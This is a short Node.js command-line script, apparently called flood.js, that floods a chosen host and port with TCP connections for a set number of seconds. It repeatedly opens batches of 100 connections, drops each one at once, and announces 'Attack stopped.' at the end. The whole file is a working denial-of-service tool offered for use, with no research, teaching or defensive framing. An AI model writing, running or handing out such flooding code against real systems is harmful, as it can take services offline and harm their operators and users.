const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];

if (process.argv.length < 5 || isNaN(parseInt(duration)) || isNaN(parseInt(port))) {
  console.log('Invalid Usage: node flood.js <target> <port> <duration>');
  process.exit(1);
} else {
  const attackInterval = setInterval(() => {
    for (let i = 0; i < 100; i++) {
      const net = require('net');
      const client = net.connect(port, target, () => {
        client.destroy();
      });
    }
  });

  setTimeout(() => {
    clearInterval(attackInterval);
    console.log('Attack stopped.');
    process.exit(0);
  }, duration * 1000);
}
